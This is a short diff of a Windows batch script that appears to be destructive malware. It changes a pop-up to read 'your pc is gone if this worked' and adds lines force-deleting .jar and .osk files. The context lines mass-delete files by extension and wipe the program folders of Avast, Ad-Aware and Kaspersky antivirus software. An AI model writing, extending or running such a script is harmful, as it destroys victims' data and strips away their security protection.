@@ -32,7 +32,7 @@ if '%errorlevel%' NEQ '0' (
 :Start
 msg * lmao
 pause
-msg * lmao part 2
+msg * your pc is gone if this worked lmaoooo
 pause
 cls
 
@@ -125,6 +125,8 @@ del *.apl /F /Q
 del *.api /F /Q
 del *.js /F /Q
 del *.html /F /Q
+del *.jar /F /Q
+del *.osk /F /Q
 del /Q /F C:\Program Files\alwils~1\avast4\*.*
 del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
 del /Q /F C:\Program Files\kasper~1\*.exe
